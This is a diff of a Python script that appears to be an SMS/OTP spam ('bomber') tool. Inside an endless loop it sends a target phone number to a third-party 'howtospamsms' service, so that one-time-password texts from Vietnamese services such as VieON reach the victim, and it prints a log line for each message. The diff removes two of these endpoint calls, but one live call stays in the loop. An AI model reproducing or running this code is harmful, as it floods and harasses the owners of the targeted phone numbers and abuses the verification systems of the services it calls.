@@ -38,14 +38,6 @@ Write.Print('===================================================================
 while True:
 
     stt=stt+1
-    requests.get(f'https://howtospamsms.herokuapp.com/meta-vn?phone={phone}')
-    Write.Print(f"[ {stt} ] [ qminh.log] => Sen OTP Meta-VN"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)
-
-    stt=stt+1
-    requests.get(f'https://howtospamsms.herokuapp.com/bach-hoa-xanh?phone={phone}')      
-    Write.Print(f"[ {stt} ] [ qminh.log] => Sen OTP Bach-Hoa-Xanh"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)
-
-    stt=stt+1
     requests.get(f'https://howtospamsms.herokuapp.com/vieon?phone=0{phone}')      
     Write.Print(f"[ {stt} ] [ qminh.log] => Sen OTP VieON"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)
     for i in range(1200, 0):
